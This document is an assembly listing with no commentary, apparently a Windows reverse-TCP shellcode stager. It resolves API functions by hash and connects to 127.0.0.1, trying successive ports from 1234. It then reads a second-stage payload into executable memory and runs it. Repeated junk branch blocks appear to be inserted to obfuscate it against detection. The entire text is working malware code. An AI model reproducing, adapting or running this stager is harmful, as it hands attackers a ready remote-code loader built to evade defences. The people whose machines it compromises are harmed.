```asm
_start:
cld
call L_88
RET_6:
pushal
pushfd
push eax
xor eax, eax
jnz bogus_1
jmp real_1
bogus_1:
nop
mov edx, edx
real_1:
pop eax
popfd
mov ebp, esp
xor eax, eax
mov edx, dword ptr fs:[eax + 0x30]
pushfd
push eax
xor eax, eax
jnz bogus_2
jmp real_2
bogus_2:
nop
mov edx, edx
real_2:
pop eax
popfd
mov edx, dword ptr [edx + 0xc]
mov edx, dword ptr [edx + 0x14]
L_15:
mov esi, dword ptr [edx + 0x28]
pushfd
push eax
xor eax, eax
jnz bogus_3
jmp real_3
bogus_3:
nop
mov edx, edx
real_3:
pop eax
popfd
movzx ecx, word ptr [edx + 0x26]
xor edi, edi
L_1e:
lodsb al, byte ptr [esi]
cmp al, 0x61
jl L_25
pushfd
push eax
xor eax, eax
jnz bogus_4
jmp real_4
bogus_4:
nop
mov edx, edx
real_4:
pop eax
popfd
sub al, 0x20
L_25:
ror edi, 0xd
add edi, eax
loop L_1e
pushfd
push eax
xor eax, eax
jnz bogus_5
jmp real_5
bogus_5:
nop
mov edx, edx
real_5:
pop eax
popfd
push edx
push edi
pushfd
push eax
xor eax, eax
jnz bogus_6
jmp real_6
bogus_6:
nop
mov edx, edx
real_6:
pop eax
popfd
mov edx, dword ptr [edx + 0x10]
mov ecx, dword ptr [edx + 0x3c]
mov ecx, dword ptr [ecx + edx + 0x78]
jecxz L_82
pushfd
push eax
xor eax, eax
jnz bogus_7
jmp real_7
bogus_7:
nop
mov edx, edx
real_7:
pop eax
popfd
add ecx, edx
push ecx
pushfd
push eax
xor eax, eax
jnz bogus_8
jmp real_8
bogus_8:
nop
mov edx, edx
real_8:
pop eax
popfd
mov ebx, dword ptr [ecx + 0x20]
add ebx, edx
mov ecx, dword ptr [ecx + 0x18]
L_45:
jecxz L_81
pushfd
push eax
xor eax, eax
jnz bogus_9
jmp real_9
bogus_9:
nop
mov edx, edx
real_9:
pop eax
popfd
dec ecx
mov esi, dword ptr [ebx + ecx*4]
add esi, edx
xor edi, edi
L_4f:
lodsb al, byte ptr [esi]
ror edi, 0xd
add edi, eax
cmp al, ah
jne L_4f
pushfd
push eax
xor eax, eax
jnz bogus_10
jmp real_10
bogus_10:
nop
mov edx, edx
real_10:
pop eax
popfd
add edi, dword ptr [ebp - 8]
cmp edi, dword ptr [ebp + 0x24]
jne L_45
pop eax
pushfd
push eax
xor eax, eax
jnz bogus_11
jmp real_11
bogus_11:
nop
mov edx, edx
real_11:
pop eax
popfd
mov ebx, dword ptr [eax + 0x24]
add ebx, edx
mov cx, word ptr [ebx + ecx*2]
mov ebx, dword ptr [eax + 0x1c]
add ebx, edx
mov eax, dword ptr [ebx + ecx*4]
add eax, edx
mov dword ptr [esp + 0x24], eax
pop ebx
pop ebx
popal
pop ecx
pop edx
push ecx
jmp eax
L_81:
pop edi
L_82:
pop edi
pop edx
mov edx, dword ptr [edx]
jmp L_15
L_88:
pop ebp
pushfd
push eax
xor eax, eax
jnz bogus_12
jmp real_12
bogus_12:
nop
mov edx, edx
real_12:
pop eax
popfd
push 0x3233
push 0x5f327377
push esp
push 0x726774c
call ebp
pushfd
push eax
xor eax, eax
jnz bogus_13
jmp real_13
bogus_13:
nop
mov edx, edx
real_13:
pop eax
popfd
mov eax, 0x190
sub esp, eax
push esp
push eax
push 0x6b8029
call ebp
push eax
push eax
push eax
push eax
inc eax
push eax
inc eax
push eax
push 0xe0df0fea
call ebp
xchg edi, eax
push 0x100007f
push 0xd2040002
mov esi, esp
L_c7:
push 0x10
push esi
push edi
push 0x6174a599
call ebp
test eax, eax
je L_e5
mov ax, word ptr [esi + 2]
xchg al, ah
inc eax
xchg al, ah
mov word ptr [esi + 2], ax
jmp L_c7
L_e5:
push 0
push 4
push esi
push edi
push 0x5fc8d902
call ebp
mov esi, dword ptr [esi]
push 0x40
push 0x1000
push esi
push 0
push 0xe553a458
call ebp
xchg ebx, eax
push ebx
L_107:
push 0
push esi
push ebx
push edi
push 0x5fc8d902
call ebp
add ebx, eax
sub esi, eax
jne L_107
ret
```